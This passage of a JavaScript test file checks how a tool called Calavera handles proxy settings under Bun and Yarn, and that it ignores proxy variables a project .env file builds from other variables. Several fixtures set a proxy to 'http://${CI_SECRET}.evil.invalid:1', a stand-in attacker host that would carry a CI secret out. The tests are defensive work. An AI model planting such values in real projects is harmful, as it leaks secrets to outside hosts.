    const result = await loadNpmRegistryOptions({ ...context, runtime: "bun", execArgv });
    assert.deepEqual(
      result.warnings,
      [
        "Ignored HTTPS_PROXY, which .env sets from a variable: Calavera cannot tell whether the value came from that file or from your own environment, because Bun keeps a variable you set, and Bun may not have loaded the file at all, as with --no-env-file or env = false in bunfig.toml. Calavera does not take a variable's value from a project file. Remove or rename HTTPS_PROXY in .env.",
      ],
      execArgv.join(" "),
    );
  }
});

test("under Yarn, the wording for a file Yarn loaded still says Yarn expanded the variable", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(warnings, [
    "Ignored YARN_HTTPS_PROXY, which .env.yarn sets from a variable: Yarn expanded the variable before Calavera started, and Calavera does not take a variable's value from a project file. Write the value without a variable in .env.yarn, or remove it from .env.yarn and set YARN_HTTPS_PROXY in your own environment.",
  ]);
});

test("under Yarn without a known folder, a .env.yarn inside node_modules is not a candidate", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/node_modules/dep/.env.yarn":
        "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
    },
    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
  });
  const { options, warnings } = await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null });
  assert.equal(options.proxy, "http://caller.example.com:1");
  assert.deepEqual(warnings, []);
});
